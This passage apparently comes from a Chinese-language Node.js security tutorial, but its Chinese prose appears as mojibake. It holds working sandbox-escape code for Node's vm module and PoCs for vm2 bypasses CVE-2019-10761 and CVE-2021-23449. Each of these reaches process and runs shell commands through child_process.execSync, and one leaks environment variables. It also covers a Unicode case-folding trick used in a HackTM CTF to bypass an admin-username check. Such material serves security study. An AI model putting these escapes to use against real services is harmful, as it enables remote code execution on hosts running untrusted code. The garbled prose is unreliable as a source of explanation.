ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š const y1 = vm.runInNewContext(`this.toString.constructor('return process')()`); ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿”å›çš„processå¯¹è±¡æ¥rceäº† y1.mainModule.require('child_process').execSync('whoami').toString() è¿™é‡ŒçŸ¥è¯†æ˜Ÿçƒä¸Šæåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸‹é¢è¿™æ®µä»£ç ï¼š const vm = require('vm'); const script = `m + n`; const sandbox = { m: 1, n: 2 }; const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res) æˆ‘ä»¬èƒ½ä¸èƒ½æŠŠthis.toString.constructor('return process')()ä¸­çš„thisæ¢æˆ{}å‘¢ï¼Ÿ {}çš„æ„æ€æ˜¯åœ¨æ²™ç®±å†…å£°æ˜äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¯¹è±¡æ˜¯ä¸èƒ½è®¿é—®åˆ°globalä¸‹çš„ã€‚ å¦‚æœæˆ‘ä»¬å°†thisæ¢æˆmå’Œnä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”è¿™äº›éƒ½æ˜¯primitiveç±»å‹ï¼Œä»–ä»¬åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å°†å€¼ä¼ é€’è¿‡å»è€Œä¸æ˜¯å¼•ç”¨ï¼ˆç±»ä¼¼äºå‡½æ•°ä¼ é€’å½¢å‚ï¼‰ï¼Œåœ¨æ²™ç›’å†…ä½¿ç”¨çš„mnå·²ç»ä¸æ˜¯åŸæ¥çš„mnäº†ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚ æˆ‘ä»¬å°†mnæ”¹æˆå…¶ä»–ç±»å‹å°±å¯ä»¥åˆ©ç”¨äº†ï¼š 6.5 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ çŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°äº†è¿™æ ·çš„æƒ…å†µï¼š const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res) æˆ‘ä»¬ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§arguments.callee.callerï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚ æˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„arguments.callee.callerå°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚ æˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™æ®µä»£ç  const vm = require('vm'); const script = `(() =&gt; { const a = {} a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString() } return a })()`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res) æˆ‘ä»¬åœ¨æ²™ç®±å†…å…ˆåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å°†è¿™ä¸ªå¯¹è±¡çš„toStringæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œé€šè¿‡arguments.callee.callerè·å¾—åˆ°æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ©ç”¨è¿™ä¸ªå¯¹è±¡çš„æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°è¿”å›äº†processï¼Œå†è°ƒç”¨processè¿›è¡Œrceï¼Œæ²™ç®±å¤–åœ¨console.logä¸­é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è§¦å‘äº†è¿™ä¸ªé‡å†™åçš„toStringå‡½æ•°ã€‚ å¦‚æœæ²™ç®±å¤–æ²¡æœ‰æ‰§è¡Œå­—ç¬¦ä¸²çš„ç›¸å…³æ“ä½œæ¥è§¦å‘è¿™ä¸ªtoStringï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å¯ä»¥ç”¨æ¥è¿›è¡Œæ¶æ„é‡å†™çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Proxyæ¥åŠ«æŒå±æ€§ Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn) const vm = require(\"vm\"); const script = ` (() =&gt;{ const a = new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) return a })() `; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc) è§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨get:è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚ å¦‚æœæ²™ç®±çš„è¿”å›å€¼è¿”å›çš„æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨çš„å¯¹è±¡æˆ–è€…æ²¡æœ‰è¿”å›å€¼åº”è¯¥æ€ä¹ˆè¿›è¡Œé€ƒé€¸å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¼‚å¸¸ï¼Œå°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»ï¼Œç„¶ååœ¨å¤–éƒ¨è¾“å‡ºï¼š const vm = require(\"vm\"); const script = ` throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) `; try { vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) { console.log(\"error:\" + e) } è¿™é‡Œæˆ‘ä»¬ç”¨catchæ•è·åˆ°äº†throwå‡ºçš„proxyå¯¹è±¡ï¼Œåœ¨console.logæ—¶ç”±äºå°†å­—ç¬¦ä¸²ä¸å¯¹è±¡æ‹¼æ¥ï¼Œå°†æŠ¥é”™ä¿¡æ¯å’Œrceçš„å›æ˜¾ä¸€èµ·å¸¦äº†å‡ºæ¥ã€‚ 6.6 vm2 é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºæ¥vmæ²™ç®±éš”ç¦»åŠŸèƒ½è¾ƒå¼±ï¼Œæœ‰å¾ˆå¤šé€ƒé€¸çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ–¹åŒ…vm2åœ¨vmçš„åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™äº›ä¼˜åŒ–å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚ å®‰è£…vm2åŒ…ï¼š npm install vm2 æ•´ä¸ªvm2åŒ…ä¸‹æ˜¯è¿™æ ·çš„ç»“æ„ï¼š cli.jså®ç°äº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨vm2 ä¹Ÿå°±æ˜¯binä¸‹çš„vm2ã€‚ contextify.jså°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼šContextify Decontextify propertyDescriptorï¼Œå¹¶ä¸”é’ˆå¯¹globalçš„Bufferç±»è¿›è¡Œäº†ä»£ç†ã€‚ main.js æ˜¯vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº†NodeVM VMè¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ªVMScriptå®é™…ä¸Šæ˜¯å°è£…äº†vm.Scriptã€‚ sandbox.jsé’ˆå¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†æ‹¦æˆªï¼Œæ¯”å¦‚setTimeoutï¼ŒsetIntervalç­‰ vm2ç›¸æ¯”vmåšå‡ºå¾ˆå¤§çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯åˆ©ç”¨äº†es6æ–°å¢çš„proxyç‰¹æ€§ï¼Œä»è€Œä½¿ç”¨é’©å­æ‹¦æˆªå¯¹constructorå’Œ__proto__è¿™äº›å±æ€§çš„è®¿é—®ã€‚ å…ˆç”¨vm2æ¼”ç¤ºä¸€ä¸‹ï¼š const {VM, VMScript} = require('vm2'); const script = new VMScript(\"let a = 2;a;\"); console.log((new VM()).run(script)); VMæ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–åè°ƒç”¨å…¶ä¸­çš„runæ–¹æ³•å°±å¯ä»¥è¿è¡Œä¸€æ®µè„šæœ¬ã€‚ é‚£ä¹ˆvm2åœ¨è¿è¡Œè¿™ä¸¤è¡Œä»£ç æ—¶éƒ½åšäº†ä»€ä¹ˆäº‹ï¼š å¯ä»¥å‘ç°ç›¸æ¯”äºvmçš„æ²™ç®±ç¯å¢ƒï¼Œvm2æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯å¼•å…¥sandbox.jså¹¶é’ˆå¯¹contextåšå°è£…ã€‚ é‚£ä¹ˆvm2å…·ä½“æ˜¯æ€ä¹ˆå®ç°å¯¹contextçš„å°è£…ï¼Ÿ vm2å‡ºç°è¿‡å¤šæ¬¡é€ƒé€¸çš„é—®é¢˜ï¼Œæ‰€ä»¥ç°æœ‰çš„ä»£ç è¢«è¿›è¡Œäº†å¤§é‡ä¿®æ”¹ï¼Œä¸ºäº†æ–¹ä¾¿åˆ†æéœ€è¦ä½¿ç”¨è¾ƒè€ç‰ˆæœ¬çš„vm2ï¼Œä½†githubä¸Šè²Œä¼¼å°†3.9ä»¥å‰çš„ç‰ˆæœ¬å…¨éƒ½åˆ é™¤äº†ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºäº†ï¼Œä»£ç åˆ†æä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥ç§»æ­¥é“¾æ¥ï¼š vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com) 6.7 vm2ä¸­çš„æ²™ç®±ç»•è¿‡ CVE-2019-10761 è¯¥æ¼æ´è¦æ±‚vm2ç‰ˆæœ¬&lt;=3.6.10 \"use strict\"; const {VM} = require('vm2'); const untrusted = ` const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } } function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } i.mainModule.require(\"child_process\").execSync(\"whoami\").toString() `; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } è¿™ä¸ªé“¾å­åœ¨pç‰›çš„çŸ¥è¯†æ˜Ÿçƒä¸Šæœ‰ï¼Œå¾ˆæŠ½è±¡ï¼Œæ²™ç®±é€ƒé€¸è¯´åˆ°åº•å°±æ˜¯è¦ä»æ²™ç®±å¤–è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè·å¾—è¿™ä¸ªå¯¹è±¡çš„constructorå±æ€§ï¼Œè¿™æ¡é“¾å­è·å–æ²™ç®±å¤–å¯¹è±¡çš„æ–¹æ³•æ˜¯ åœ¨æ²™ç®±å†…ä¸æ–­é€’å½’ä¸€ä¸ªå‡½æ•°ï¼Œå½“é€’å½’æ¬¡æ•°è¶…è¿‡å½“å‰ç¯å¢ƒçš„æœ€å¤§å€¼æ—¶ï¼Œæˆ‘ä»¬æ­£å¥½è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ã€‚ä¸¾ä¸ªä¾‹å­ï¼š å‡è®¾å½“å‰ç¯å¢ƒä¸‹æœ€å¤§é€’å½’å€¼ä¸º1000ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæ§åˆ¶é€’å½’999æ¬¡ï¼ˆæ³¨æ„è¿™é‡Œè¯´çš„é€’å½’å€¼ä¸æ˜¯ä¸€ç›´è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼Œè€Œæ˜¯å•æ¬¡ç¨‹åºå†…è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆçš„æœ€å¤§å€¼ï¼‰ï¼š r(i); // è¯¥å‡½æ•°é€’å½’999æ¬¡ f.call(ft); // é€’å½’åˆ°ç¬¬1000æ¬¡æ—¶è°ƒç”¨fè¿™ä¸ªå‡½æ•°ï¼Œfä¸ºBuffer.prototype.writeï¼Œå°±æ˜¯ä¸‹é¢å›¾ç‰‡çš„è¿™ä¸ªå‡½æ•° this.utf8Write() // é€’å½’åˆ°1001æ¬¡æ—¶ä¸ºè¯¥å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œæ‰€ä»¥çˆ†æ ˆæ—¶æ•æ‰çš„å¼‚å¸¸ä¹Ÿæ˜¯æ²™ç®±å¤–ï¼Œä»è€Œè¿”å›äº†ä¸€ä¸ªæ²™ç®± å¤–çš„å¼‚å¸¸å¯¹è±¡ CVE-2021-23449 è¿™ä¸ªæ¼æ´åœ¨snykè§£é‡Šæ˜¯åŸå‹é“¾æ±¡æŸ“å¯¼è‡´çš„æ²™ç®±é€ƒé€¸ï¼Œä½†pç‰›åœ¨çŸ¥è¯†æ˜Ÿçƒé‡Œå‘äº†å…¶å®æ˜¯å¦å¤–çš„åŸå›  Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk pocï¼š let res = import('./foo.js') res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString(); import()åœ¨JavaScriptä¸­æ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œä¸æ˜¯å‡½æ•°ï¼Œæ²¡æ³•é€šè¿‡ä¹‹å‰å¯¹requireè¿™ç§å‡½æ•°å¤„ç†ç›¸åŒçš„æ–¹æ³•æ¥å¤„ç†å®ƒï¼Œå¯¼è‡´å®é™…ä¸Šæˆ‘ä»¬è°ƒç”¨import()çš„ç»“æœå®é™…ä¸Šæ˜¯æ²¡æœ‰ç»è¿‡æ²™ç®±çš„ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å˜é‡ã€‚ æˆ‘ä»¬å†è·å–è¿™ä¸ªå˜é‡çš„å±æ€§å³å¯ç»•è¿‡æ²™ç®±ã€‚ vm2å¯¹æ­¤çš„ä¿®å¤æ–¹æ³•ä¹Ÿå¾ˆç²—ç³™ï¼Œæ­£åˆ™åŒ¹é…å¹¶æ›¿æ¢äº†\\bimport\\bå…³é”®å­—ï¼Œåœ¨ç¼–è¯‘å¤±è´¥çš„æ—¶å€™ï¼ŒæŠ¥Dynamic Import not supportedé”™è¯¯ã€‚ çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick Symbol = { get toStringTag(){ throw f=&gt;f.constructor(\"return process\")() } }; try{ Buffer.from(new Map()); }catch(f){ Symbol = {}; f(()=&gt;{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); } åœ¨vm2çš„åŸç†ä¸­æåˆ°vm2ä¼šä¸ºå¯¹è±¡é…ç½®ä»£ç†å¹¶åˆå§‹åŒ–ï¼Œå¦‚æœå¯¹è±¡æ˜¯ä»¥ä¸‹ç±»å‹ï¼š å°±ä¼šreturn Decontextify.instance å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­ç”¨åˆ°äº†Symbolå…¨å±€å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒSymbolå¯¹è±¡çš„getterå¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œå†åœ¨æ²™ç®±å†…æ‹¿åˆ°è¿™ä¸ªå¼‚å¸¸å¯¹è±¡å°±å¯ä»¥äº† 6.8 ç®€å•ç†è§£ vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸ï¼š é€ƒé€¸ä¾‹å­ï¼š const vm = require(\"vm\"); const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`); console.log(env); æ‰§è¡Œä¹‹åå¯ä»¥è·å–åˆ°ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡ ä¸Šé¢ä¾‹å­çš„ä»£ç ç­‰ä»·äºå¦‚ä¸‹ä»£ç ï¼š const vm = require('vm'); const sandbox = {}; const script = new vm.Script(\"this.constructor.constructor('return this.process.env')()\"); const context = vm.createContext(sandbox); env = script.runInContext(context); console.log(env); åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œé¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ sandboxï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontextï¼Œvm è„šæœ¬ä¸­å…¨å±€ this æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡ã€‚ å› ä¸ºthis.constructor.constructorè¿”å›çš„æ˜¯ä¸€ä¸ªFunction constructorï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨Functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œã€‚(æ­¤æ—¶Functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„) è¿™é‡Œæ„é€ çš„å‡½æ•°å†…çš„è¯­å¥æ˜¯return this.process.envï¼Œç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚ é…åˆchile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼š const vm = require(\"vm\"); const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('whoami').toString()`); console.log(env); æœ€è¿‘çš„mongo-express RCE(CVE-2019-10758)æ¼æ´å°±æ˜¯é…åˆvmæ²™ç®±é€ƒé€¸æ¥åˆ©ç”¨çš„ã€‚ å…·ä½“åˆ†æå¯å‚è€ƒï¼šCVE-2019-10758:mongo-expressRCEå¤ç°åˆ†æ 6.9 javascriptå¤§å°å†™ç‰¹æ€§ åœ¨javascriptä¸­æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹ å¯¹äºtoUpperCase(): å­—ç¬¦\"Ä±\"ã€\"Å¿\" ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º \"I\"ã€\"S\" å¯¹äºtoLowerCase(): å­—ç¬¦\"â„ª\"ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º\"k\"(è¿™ä¸ªâ„ªä¸æ˜¯K) åœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡ å¯å‚è€ƒpç¥çš„æ–‡ç« ï¼šhttps://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 6.10 CTFé¢˜å®ä¾‹ - Hacktmä¸­çš„ä¸€é“Nodejsé¢˜ é¢˜ç›®éƒ¨åˆ†æºç ï¼š function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() ); } function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase(); } è§£é¢˜æ—¶éœ€è¦ç™»å½•ç®¡ç†å‘˜çš„ç”¨æˆ·åï¼Œä½†æ˜¯åœ¨ç™»å½•æ—¶ï¼ŒisValidUserå‡½æ•°ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åè¿›è¡ŒtoUpperCaseå¤„ç†ï¼Œå†ä¸ç®¡ç†å‘˜ç”¨æˆ·åè¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœè¾“å…¥çš„ç”¨æˆ·åä¸ç®¡ç†å‘˜ç”¨æˆ·åç›¸åŒï¼Œå°±ä¸å…è®¸ç™»å½•ã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¹‹åçš„ä¸€ä¸ªåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜çš„å‡½æ•°ä¸­ï¼Œå¯¹ç”¨æˆ·åè¿›è¡Œå¤„ç†çš„æ˜¯toLowerCaseã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªå·®å¼‚ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤§å°å†™ç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ã€‚ é¢˜ç›®ä¸­é»˜è®¤çš„ç®¡ç†å‘˜ç”¨æˆ·åä¸ºï¼šhacktm æ‰€ä»¥ï¼Œæˆ‘ä»¬æŒ‡å®šç™»å½•æ—¶çš„ç”¨æˆ·åä¸ºï¼šhacâ„ªtm å³å¯ç»•è¿‡isValidUserå’ŒisAdminçš„éªŒè¯ã€‚ é¢˜ç›®å®Œæ•´Writeup:HackTMä¸­ä¸€é“Node.jsé¢˜åˆ†æ(Draw with us) 0x07 Tips 7.1 fs æ–‡ä»¶ç³»ç»Ÿ fs æ¨¡å—æ”¯æŒä»¥æ ‡å‡† POSIX å‡½æ•°å»ºæ¨¡çš„æ–¹å¼ä¸æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚ å…¶ä¸­æœ€ç®€å•çš„ä¸€ä¸ªå°±æ˜¯æ–‡ä»¶è¯»å–çš„æ“ä½œ ä½†æ˜¯æˆ‘ä»¬å¾—åˆ†æ¸…æ¥š åŒæ­¥å’Œå¼‚æ­¥ åŒºåˆ«ï¼š åŒæ­¥é˜»å¡ï¼šåŒæ­¥çš„ API ä¼šé˜»æ­¢ Node.js äº‹ä»¶å¾ªç¯å’Œè¿›ä¸€æ­¥çš„ JavaScript æ‰§è¡Œï¼Œç›´åˆ°æ“ä½œå®Œæˆã€‚ å¼‚æ­¥é˜»å¡ï¼šå¯¹äºä¸€ä¸ª IO æ“ä½œï¼Œæ¯”å¦‚ä¸€ä¸ª ajaxï¼Œå½“å‘å‡ºä¸€ä¸ªå¼‚æ­¥è¯·æ±‚åï¼Œç¨‹åºä¸ä¼šé˜»å¡åœ¨é‚£é‡Œç­‰å¾…ç»“æœçš„è¿”å›ï¼Œè€Œæ˜¯ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚ å½“è¯·æ±‚æˆåŠŸè·å–åˆ°ç»“æœåï¼Œå°±ä¼šè°ƒç”¨å›è°ƒå‡½æ•°æ¥å¤„ç†åé¢çš„äº‹æƒ…ï¼Œè¿™ä¸ªå°±æ˜¯å¼‚æ­¥ ç®€å•ä½†ä¸å®Œå…¨æ­£ç¡®çš„è¯´ï¼š åŒå¼‚æ­¥ä¸ç°å®ç”Ÿæ´»çš„æ–¹å¼ç›¸åï¼ŒåŒæ­¥å°±æ˜¯äº‹ä¸€ä»¶ä¸€ä»¶åšï¼Œåšå®Œä¸€ä»¶å†åšä¸‹ä¸€ä»¶ï¼Œè€Œå¼‚æ­¥æ˜¯åŒæ—¶å¼€å§‹ã€‚ ä¸¾ä¸ªä¾‹å­ var fs = require('fs');//å¯¼å…¥fsæ¨¡å— a = fs.readFileSync('./m1.txt'); console.log(a.toString()); console.log(\"ç»“æŸ!\"); è¿™æ˜¯åŒæ­¥ï¼Œå®ƒçš„è¾“å‡ºç»“æœä¸º å¾ˆæ˜æ˜¾æ˜¯ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆï¼Œç„¶åæ‰§è¡Œä¸‹ä¸€ä¸ªæ“ä½œ æ¥ä¸‹æ¥æ˜¯å¼‚æ­¥ var fs = require(\"fs\");//å¯¼å…¥fsæ¨¡å— fs.readFile('./m1.txt', function (err, data) { if (err) return console.error(err); console.log(data.toString()); console.log(\"------------------\") console.log(\"ç°åœ¨æ‰ç»“æŸï¼\") }); console.log(\"ç»“æŸï¼Ÿ\"); è¿™æ˜¯å°±æ˜¯å¼‚æ­¥ï¼Œå®ƒçš„è¾“å‡ºç»“æœä¸º å¼‚æ­¥ä»ä¸ç­‰å¾…æ¯ä¸ªæ“ä½œå®Œæˆï¼Œè€Œæ˜¯åœ¨ç¬¬ä¸€æ­¥æ‰§è¡Œæ‰€æœ‰æ“ä½œ 7.2 å…¨å±€å˜é‡å±•å¼€ __dirnameï¼šå½“å‰æ¨¡å—çš„ç›®å½•åã€‚ __filenameï¼šå½“å‰æ¨¡å—çš„æ–‡ä»¶åã€‚è¿™æ˜¯å½“å‰çš„æ¨¡å—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼ˆç¬¦å·é“¾æ¥ä¼šè¢«è§£æï¼‰ã€‚ exports å˜é‡æ˜¯é»˜è®¤èµ‹å€¼ç»™ module.exportsï¼Œå®ƒå¯ä»¥è¢«èµ‹äºˆæ–°å€¼ï¼Œå®ƒä¼šæš‚æ—¶ä¸ä¼šç»‘å®šåˆ° module.exportsã€‚ moduleï¼šåœ¨æ¯ä¸ªæ¨¡å—ä¸­ï¼Œ module çš„è‡ªç”±å˜é‡æ˜¯å¯¹è¡¨ç¤ºå½“å‰æ¨¡å—çš„å¯¹è±¡çš„å¼•ç”¨ã€‚ä¸ºæ–¹ä¾¿èµ·è§ï¼Œè¿˜å¯ä»¥é€šè¿‡å…¨å±€æ¨¡å—çš„ exports è®¿é—® module.exportsã€‚module å®é™…ä¸Šä¸æ˜¯å…¨å±€çš„ï¼Œè€Œæ˜¯æ¯ä¸ªæ¨¡å—æœ¬åœ°çš„ require æ¨¡å—å°±ä¸å¤šè¯´äº†ï¼Œç”¨äºå¼•å…¥æ¨¡å—ã€ JSONã€æˆ–æœ¬åœ°æ–‡ä»¶ã€‚å¯ä»¥ä» node_modules å¼•å…¥æ¨¡å—ã€‚ æˆ‘ä»¬å¸¸ç”¨çš„å…¨å±€å˜é‡ä¸º__dirnameå’Œ__filename 7.3 child_process child_process æä¾›äº†å‡ ç§åˆ›å»ºå­è¿›ç¨‹çš„æ–¹å¼ å¼‚æ­¥æ–¹å¼ï¼šspawnã€execã€execFileã€fork åŒæ­¥æ–¹å¼ï¼šspawnSyncã€execSyncã€execFileSync ç»è¿‡ä¸Šé¢çš„åŒæ­¥å’Œå¼‚æ­¥æ€æƒ³çš„ç†è§£ï¼Œåˆ›å»ºå­è¿›ç¨‹çš„åŒæ­¥å¼‚æ­¥æ–¹å¼åº”è¯¥ä¸éš¾ç†è§£ã€‚ å¼‚æ­¥è¿›ç¨‹çš„åˆ›å»º child_process.exec (): è¡ç”Ÿ shell å¹¶åœ¨è¯¥ shell 